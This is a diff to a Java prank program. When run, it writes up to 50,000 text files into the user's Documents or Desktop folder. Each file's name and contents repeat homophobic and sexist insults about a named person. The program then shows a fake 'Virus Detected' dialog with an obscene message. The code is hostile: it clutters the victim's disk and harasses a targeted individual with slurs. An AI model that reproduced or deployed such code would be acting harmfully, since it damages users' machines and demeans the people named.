@@ -69,34 +69,39 @@ public class FileCreation implements Runnable {
         String adjective = "";
         String filename = "";
         if (gender.toLowerCase().equals("male")) {
-            adjective = "Gayest";
+            adjective = "is the Gayest";
         }
         else if (gender.toLowerCase().equals("female")) {
-            adjective = "Dumbest";
+            adjective = "has the Saggiest Tits";
         }
         else {
-            adjective = "Most Annoying";
+            adjective = "has the Saggiest Tits";
         }
         for (int i=0; i < numFiles; i++) {
             filename = name.replaceAll(" ", "") + "IsSuperGay" + (i+1) + ".txt";
             File file;
             PrintWriter printWriter;
             try {
-                file = new File("../Desktop/" + filename);
+                file = new File("../Documents/" + filename);
                 printWriter = new PrintWriter(file);
             } catch (Exception ex) {
                 //Logger.getLogger(FileCreation.class.getName()).log(Level.SEVERE, null, ex);
                 try {
-                    file = new File(filename);
+                    file = new File("../Desktop/" + filename);
                     printWriter = new PrintWriter(file);
                 } catch (Exception ex2) {
-                    Logger.getLogger(FileCreation.class.getName()).log(Level.SEVERE, null, ex2);
-                    return;
+                    try {
+                        file = new File(filename);
+                        printWriter = new PrintWriter(file);
+                    } catch (Exception ex3) {
+                        Logger.getLogger(FileCreation.class.getName()).log(Level.SEVERE, null, ex3);
+                        return;
+                    }
                 }
             }
             
-            for (int j=0; j < 10000; j++) {
-                printWriter.println(name + " is the " + adjective);
+            for (int j=0; j < 500; j++) {
+                printWriter.println(name + adjective);
             }
             
             System.out.println("DONE");
@@ -115,7 +120,7 @@ public class FileCreation implements Runnable {
     @Override
     public void run() {
         System.out.println("EXECUTE");
-        CreateFiles(100000);
+        CreateFiles(50000);
         JOptionPane.showMessageDialog(null, "ERROR: Virus Detected\n" + 
                                             "Recommended course of action: Go Fuck Yourself");
         System.exit(0);
